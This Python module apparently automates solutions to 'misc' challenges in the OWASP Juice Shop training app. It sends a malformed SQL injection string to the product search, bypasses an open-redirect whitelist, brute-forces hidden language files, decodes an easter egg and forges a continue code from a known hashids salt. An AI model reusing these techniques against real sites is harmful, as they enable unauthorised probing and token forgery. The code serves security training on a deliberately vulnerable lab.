import codecs
import json
from base64 import b64decode

from hashids import Hashids

from authentication import get_admin_session
from filehandling import get_easter_egg_content
from products import search_products


def provoke_error(server, session):
    """
    Provoke an error that is not handled gracefully by performing a bad SQLi on product search.
    :param server: juice shop URL
    :param session: Session
    """
    try:
        print('Trying to cause an unhandled error...'),
        search_products(server, session, "'))")
        print('Well that didn\'t work.')
    except RuntimeError:
        print('Success.')
        pass


def access_score_board(server, session):
    """
    Grab the tracking .png for the score board.
    :param server: juice shop url
    :param session: Session
    """
    tracking = '{}/public/images/tracking/scoreboard.png'.format(server)
    scoreboard = session.get(tracking)
    if not scoreboard.ok:
        raise RuntimeError('Error accessing score board asset.')


def access_administration(server, session):
    """
    Grab the tracking .png for the administration panel.
    :param server: juice shop URL
    :param session: Session
    """
    tracking = '{}/public/images/tracking/administration.png'.format(server)
    admin = session.get(tracking)
    if not admin.ok:
        raise RuntimeError('Error accessing administration asset.')


def bypass_redirect_whitelist(server, session):
    """
    Open Google by passing a whitelisted URL as a parameter.
    :param server: juice shop URL
    :param session: Session
    """
    whitelisted = 'https://github.com/bkimminich/juice-shop'
    bypass = session.get('{}/redirect?to=https://google.com/?{}'.format(server, whitelisted), verify=False)
    if not bypass.ok:
        raise RuntimeError('Error bypassing redirection whitelist.')


def check_all_language_files(server, session):
    """
    Check a whole lot of possible language codes, should find our hidden language.
    :param server: juice shop URL
    :param session: Session
    """
    print('\nBrute forcing scan of language files on the server...')
    with open('language_codes.json', 'rb') as infile:
        languages = json.loads(infile.read())
    for lang in languages:
        code = _get_language_code(lang)
        if not code:
            continue
        if _check_language_file_exists(server, session, code):
            print('Found language file: {}'.format(lang.get('English')))
    print('Language file scan complete.\n')


def _get_language_code(language):
    """
    Retrieve all two and three letter language codes from language dict
    :param language: language code dict from language_codes.json
    :return: language code as string or None
    """
    code = language.get('alpha2')
    if not code:
        code = language.get('alpha3-b')
    return code


def _check_language_file_exists(server, session, code):
    """
    Try to GET the file from the server. If it exists it'll be a JSON file, otherwise we'd load a webpage.
    :param server: juice shop URL
    :param session: Session
    :param code: language code dict from language_codes.json
    :return: True if detected
    """
    check = session.get('{}/i18n/{}.json'.format(server, code))
    if check.headers.get('Content-Type') == 'application/json':
        return True


def _get_real_easter_egg_text(server, session):
    """
    Cut out the irrelevant parts of the easter egg file and fetch the encoded text.
    :param server: juice shop URL.
    :param session: Session
    :return: encoded easter egg
    """
    eggfile = get_easter_egg_content(server, session)
    lines = _convert_contents_to_non_empty_list(eggfile)
    # Exclude on spaces and ellipses, we only want the encoded text.
    exclusions = [' ', '...']
    for line in lines:
        # Skip excluded lines, return only the easter egg.
        if any(skip in line for skip in exclusions):
            continue
        return line


def _convert_contents_to_non_empty_list(text):
    lines = text.split('\n')
    return filter(None, lines)


def decrypt_easter_egg(server, session):
    """
    Download eastere.gg from /ftp, pull out the hidden string, decode with base64 then rot13, and open the path
    :param server: juice shop URL
    :param session: Session
    """
    print('Fetching text from eastere.gg, hopefully...')
    egg = _get_real_easter_egg_text(server, session)
    print('Easter egg text: {}'.format(egg))
    partial = b64decode(egg)
    print('After Base 64 decoding: {}'.format(partial))
    actual = codecs.encode(partial, 'rot_13')
    print('After ROT13 decoding: {}'.format(actual))
    eggurl = '{}{}'.format(server, actual)
    print('Opening {}...'.format(eggurl)),
    session.get(eggurl)
    print('Success.')


def _generate_continue_code(num):
    """
    Takes a single int, or list of ints, and generates a continue code
    :param num: target challenge id(s)
    :return: continue code as string
    """
    if type(num) == int:
        num = [num]
    # Salt taken from example text here: http://hashids.org/python/
    hashids = Hashids(salt="this is my salt", min_length=60)
    return hashids.encode(*num)


def solve_challenge_99(server, session):
    """
    Solve the non-existent challenge #99
    :param server: juice shop URL
    :param session: Session
    """
    code = _generate_continue_code(99)
    print('Trying to solve challenge 99...'),
    continurl = '{}/rest/continue-code/apply/{}'.format(server, code)
    attempt = session.put(continurl)
    if not attempt.ok:
        raise RuntimeError('Error solving challenge 99.')
    print('Success.')


def solve_misc_challenges(server):
    print('\n== MISC CHALLENGES ==\n')
    session = get_admin_session(server)
    access_score_board(server, session)
    access_administration(server, session)
    bypass_redirect_whitelist(server, session)
    check_all_language_files(server, session)
    provoke_error(server, session)
    #decrypt_easter_egg(server, session)
    solve_challenge_99(server, session)
    print('\n== MISC CHALLENGES COMPLETE ==\n')
